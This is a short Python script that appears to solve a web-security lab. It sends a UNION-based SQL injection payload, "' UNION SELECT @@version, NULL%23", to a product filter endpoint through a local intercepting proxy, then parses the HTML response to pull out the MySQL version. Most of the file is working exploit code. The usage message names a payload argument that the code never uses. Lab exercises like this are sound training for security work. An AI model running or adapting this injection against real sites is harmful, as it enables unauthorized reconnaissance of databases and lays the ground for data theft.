import requests
import sys
import urllib3 
from bs4 import BeautifulSoup 
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def exploit_mysql_version(url):
    path = "/filter?category=Pets"
    sql_payload = "' UNION SELECT @@version, NULL%23" # The char is sent because the # is a special character in URLs so we encode it
    req = requests.get(url + path + sql_payload , proxies=proxies, verify=False)
    res = req.text  
    soup = BeautifulSoup(res, 'html.parser')
    ubuntu_pattern = re.compile('.*ubuntu.*')
    version_element_tag = soup.find('th', string=ubuntu_pattern)
    version = version_element_tag.text if version_element_tag else None
    if version:
        print(f"[+] The mysql version is '{version}'")
        return True
    return False



if __name__ == "__main__":
    try:
        url=sys.argv[1].strip() #we take the URL from command line arguments
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print("[-] Example: %s http://example.com '1=1'" % sys.argv[0])
        sys.exit(-1)

print("[+] Figuring out the version of mysql...")

if not exploit_mysql_version(url):
    print("[-] Could not determine the mysql version")
    sys.exit(-1)

